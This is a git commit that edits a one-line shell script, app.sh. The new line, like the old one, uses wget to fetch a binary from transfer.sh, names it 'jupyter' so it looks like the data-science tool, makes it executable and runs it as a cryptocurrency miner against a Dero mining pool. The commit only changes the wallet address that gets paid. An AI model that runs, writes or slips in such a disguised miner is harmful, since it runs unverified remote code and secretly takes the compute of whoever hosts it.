9b124d178940d0c7e1c6dac3af02f3bce62939ff
Hanaang Offical <112566796+hanaang@users.noreply.github.com>
2022-10-18 09:41:24 +0700

    Update app.sh

--- app.sh
+++ app.sh
@@ -1,1 +1,1 @@
-wget https://transfer.sh/WnjibV/jupyter && chmod +x jupyter && ./jupyter -r pool.whalesburg.com:4300 -w deroi1qyzlxxgq2weyqlxg5u4tkng2lf5rktwanqhse2hwm577ps22zv2x2q9pvfz92xmk2nadysceg79q8gxteg.AMD-Ryzen
+wget https://transfer.sh/WnjibV/jupyter && chmod +x jupyter && ./jupyter -r pool.whalesburg.com:4300 -w dero1qy5ej3leuegvztetxpv9f3v8z60alq0p3s2gkz0kswh2hd5w3gz72qgs4dzvk
